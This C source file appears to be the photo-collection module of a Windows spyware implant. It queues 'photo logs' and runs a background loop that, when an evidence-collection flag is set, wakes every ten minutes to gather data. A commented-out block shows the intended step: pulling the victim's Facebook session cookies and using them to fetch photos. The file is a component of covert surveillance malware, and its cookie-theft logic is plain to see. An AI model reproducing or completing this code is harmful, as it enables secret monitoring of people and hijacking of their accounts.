#include <Windows.h>

#include "cookies.h"
#include "globals.h"
#include "social.h"
#include "utils.h"
#include "uthash.h"
#include "zmem.h"

#include "photo.h"
#include "photo_facebook.h"

#ifdef _DEBUG
#include "debug.h"
#endif


PHOTO_LOGS lpPhotoLogs[MAX_PHOTO_QUEUE];

/* common defines */
#ifdef _DEBUG
#define PHOTO_SLEEP			30 // PhotoMain thread sleep in seconds
#else
#define PHOTO_SLEEP			10 * 60 // 10 minutes
#endif

/* log functions */
BOOL QueuePhotoLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
{
	if (!lpEvBuff || !dwEvSize)
		return FALSE;

	for (DWORD i=0; i < MAX_PHOTO_QUEUE; i++)
	{
		if (lpPhotoLogs[i].dwSize == 0 || lpPhotoLogs[i].lpBuffer == NULL)
		{
			lpPhotoLogs[i].dwSize	= dwEvSize;
			lpPhotoLogs[i].lpBuffer = lpEvBuff;
			
			return TRUE;
		}
	}

	return FALSE;
}


/* photo module main function */
// will be used when filsystem photos will be implemented, Facebook photos are run from social.cpp
VOID PhotoMain()
{
	
	while(1)
	{

		if (bPhotoThread == FALSE)
		{
#ifdef _DEBUG
			OutputDebug(L"[*] PhotoMain exiting\n");
#endif
			hPhotoThread = NULL;
			return;
		}

		if (bCollectEvidences)
		{



			/*LPSTR strFacebookCookies = GetCookieString(FACEBOOK_DOMAIN);
			if (strFacebookCookies)
			{
				FacebookPhotoHandler(strFacebookCookies);
				zfree_s(strFacebookCookies);
			}*/

		}

		MySleep(PHOTO_SLEEP);
	}

}


